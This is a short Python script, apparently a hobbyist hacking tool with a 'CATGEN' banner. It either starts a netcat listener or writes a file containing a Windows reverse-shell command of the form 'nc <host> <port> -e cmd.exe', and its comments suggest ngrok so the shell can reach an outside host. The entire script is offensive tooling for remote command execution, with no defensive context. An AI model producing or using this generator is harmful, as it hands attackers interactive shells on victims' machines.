import os
import time
import subprocess

print("""\n ▄████▄   ▄▄▄     ▄▄▄█████▓  ▄████ ▓█████  ███▄    █ 
▒██▀ ▀█  ▒████▄   ▓  ██▒ ▓▒ ██▒ ▀█▒▓█   ▀  ██ ▀█   █ 
▒▓█    ▄ ▒██  ▀█▄ ▒ ▓██░ ▒░▒██░▄▄▄░▒███   ▓██  ▀█ ██▒
▒▓▓▄ ▄██▒░██▄▄▄▄██░ ▓██▓ ░ ░▓█  ██▓▒▓█  ▄ ▓██▒  ▐▌██▒
▒ ▓███▀ ░ ▓█   ▓██▒ ▒██▒ ░ ░▒▓███▀▒░▒████▒▒██░   ▓██░
░ ░▒ ▒  ░ ▒▒   ▓▒█░ ▒ ░░    ░▒   ▒ ░░ ▒░ ░░ ▒░   ▒ ▒ 
  ░  ▒     ▒   ▒▒ ░   ░      ░   ░  ░ ░  ░░ ░░   ░ ▒░
░          ░   ▒    ░      ░ ░   ░    ░      ░   ░ ░ 
░ ░            ░  ░              ░    ░  ░         ░ 
░                                                    \n\n""")



time.sleep(2)
ncport = 3002 #if you change this port make sure it's free
nchost = '127.0.0.1' #can be a local ip or external ip, i recommend using ngrok
bandaid = '-e cmd.exe' #lol
print("Select which option you'd like to continue... \n\n")
time.sleep(1)
beginning = input("1. Start a netcat listener (1) \n2. Generate a netcat file for Windows (2): \n\n")
if beginning == '1':
    try: 
        print("Starting listener and waiting for a connection...\n")
        subprocess.check_output(
        'nc -lnvp' + str(ncport) , shell=True
    ).splitlines()
    except subprocess.CalledProcessError:
        print("An error was detected, maybe the port is used?")
        exit()
if beginning == '2':
    nameoffile = input("What do you want the name of your file to be? ") 
    with open(nameoffile, 'w') as f:
        f.write('nc' + ' ' +  str(nchost) + ' ' + str(ncport) + ' ' + bandaid)
    print("%s created." % (nameoffile))
